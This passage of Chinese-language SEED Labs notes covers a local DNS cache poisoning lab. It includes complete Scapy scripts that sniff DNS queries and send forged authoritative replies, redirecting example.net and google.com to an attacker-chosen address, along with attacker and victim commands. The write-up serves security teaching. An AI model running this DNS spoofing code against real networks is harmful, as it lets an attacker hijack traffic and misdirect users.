        Addsec1 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'ns1.example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.7'</span><span class="token punctuation">)</span> 
        Addsec2 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'ns2.example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.8'</span><span class="token punctuation">)</span>
        <span class="token comment"># 组装 DNS 报文</span>
        DNSpkt <span class="token operator">=</span> DNS<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span> qd<span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">,</span> aa<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> rd<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> 
                    qr<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> qdcount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ancount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> nscount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> arcount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> 
                    an<span class="token operator">=</span>Anssec<span class="token punctuation">,</span> ns<span class="token operator">=</span>NSsec1<span class="token operator">/</span>NSsec2<span class="token punctuation">,</span> ar<span class="token operator">=</span>Addsec1<span class="token operator">/</span>Addsec2<span class="token punctuation">)</span>
        <span class="token comment"># 组装整个 IP 包</span>
        spoofpkt <span class="token operator">=</span> IPpkt<span class="token operator">/</span>UDPpkt<span class="token operator">/</span>DNSpkt
        <span class="token comment"># 发</span>
        send<span class="token punctuation">(</span>spoofpkt<span class="token punctuation">)</span>
<span class="token comment"># Sniff UDP query packets and invoke spoof_dns().</span>
pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'udp and dst port 53'</span><span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof_dns<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>攻击者:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ python3 Task7.py
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>受害者:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ <span class="token function">dig</span> www.example.net
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="t8-targeting-another-domain"><a href="#t8-targeting-another-domain" class="header-anchor">#</a> T8 Targeting Another Domain</h2> <p>添加其他域.</p> <p><em>Task8.py</em></p> <div class="language-py line-numbers-mode"><div class="highlight-lines"><br><br><br><div class="highlighted"> </div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><br><br><br><br><br><br><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><br><br><br><br><br><br><br></div><pre class="language-py"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">def</span> <span class="token function">spoof_dns</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>DNS <span class="token keyword">in</span> pkt <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">b'example.net'</span> <span class="token keyword">in</span> pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">.</span>qname <span class="token keyword">or</span> <span class="token string">b'google.com'</span> <span class="token keyword">in</span> pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">.</span>qname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;I am in&quot;</span><span class="token punctuation">)</span>
        <span class="token comment"># 交换源 IP 和目的 IP</span>
        IPpkt <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">,</span> src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">)</span>
        <span class="token comment"># 交换源端口和目的端口</span>
        UDPpkt <span class="token operator">=</span> UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>UDP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">,</span> sport<span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">)</span>

        <span class="token comment"># The Answer Section</span>
        Anssec <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">.</span>qname<span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.6'</span><span class="token punctuation">)</span>
        <span class="token comment"># The Authority Section</span>
        NSsec1 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns1.example.net'</span><span class="token punctuation">)</span> 
        NSsec2 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns2.example.net'</span><span class="token punctuation">)</span>
        NSsec3 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'google.com'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns1.example.net'</span><span class="token punctuation">)</span> 
        NSsec4 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'google.com'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns2.example.net'</span><span class="token punctuation">)</span>
        <span class="token comment"># The Additional Section</span>
        Addsec1 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'ns1.example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.7'</span><span class="token punctuation">)</span> 
        Addsec2 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'ns2.example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.8'</span><span class="token punctuation">)</span>
        <span class="token comment"># 组装 DNS 报文</span>
        DNSpkt <span class="token operator">=</span> DNS<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span> qd<span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">,</span> aa<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> rd<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> 
                    qr<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> qdcount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ancount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> nscount<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> arcount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> 
                    an<span class="token operator">=</span>Anssec<span class="token punctuation">,</span> ns<span class="token operator">=</span>NSsec1<span class="token operator">/</span>NSsec2<span class="token operator">/</span>NSsec3<span class="token operator">/</span>NSsec4<span class="token punctuation">,</span> ar<span class="token operator">=</span>Addsec1<span class="token operator">/</span>Addsec2<span class="token punctuation">)</span>
        <span class="token comment"># 组装整个 IP 包</span>
        spoofpkt <span class="token operator">=</span> IPpkt<span class="token operator">/</span>UDPpkt<span class="token operator">/</span>DNSpkt
        <span class="token comment"># 发</span>
        send<span class="token punctuation">(</span>spoofpkt<span class="token punctuation">)</span>
<span class="token comment"># Sniff UDP query packets and invoke spoof_dns().</span>
pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'udp and dst port 53'</span><span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof_dns<span class="token punctuation">)</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>仍然让受害者 <code>dig example.net</code>, 但是现在第 1 处高亮位置添加 <code>google.com</code> 的处理判断, 在 <em>Authority Section</em> 中添加添加 <code>google.com</code> 对应的内容 (第 2 部分的高亮). 同时修改 <em>DNSpkt</em> 的参数: <em>nscount</em> 与 <em>ns</em> (第3 部分高亮).</p> <p><img src="/note/img/2020-02-17-14-06-35.png" alt=""></p> <p>之后受害者使用 <code>dig google.com</code> 之类指令时, 本地 DNS 服务器就会直接返回 <code>1.2.3.6</code> 的 answer.</p> <h2 id="t9-targeting-the-additional-section"><a href="#t9-targeting-the-additional-section" class="header-anchor">#</a> T9 Targeting the Additional Section</h2> <p><em>Additional Section</em> 的作用是记录一些额外的信息, 实际中用来记录一些主机的 IP. T9 计划在 <em>Additional Section</em> 添加一些内容, 并被本地 DNS 服务器缓存下来.</p> <p>实验指导中的 <em>Additional Section</em> 中一共有三条记录, 前两条, 在 T7 和 T8 中已经完成了,</p> <div class="custom-block warning"><p class="custom-block-title">DNS 响应</p> <p>两个 DNS 响应, 是否存在后者覆盖前者的情况? 这个应该是 scapy 中 filter 的问题, 应该只保留 DNS 服务器发出的请求</p></div></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">2/17/2020, 9:40:23 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/log/seed_labs/Public-Key Infrastructure Lab.html" class="prev">Public-Key Infrastructure Lab</a></span> <span class="next"><a href="/log/seed_labs/Remote DNS Cache Poisoning Attack Lab.html">Remote DNS Cache Poisoning Attack Lab</a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.27d58fa7.js" defer></script><script src="/assets/js/2.f1f09924.js" defer></script><script src="/assets/js/38.8bd5bba9.js" defer></script>
  </body>
</html>
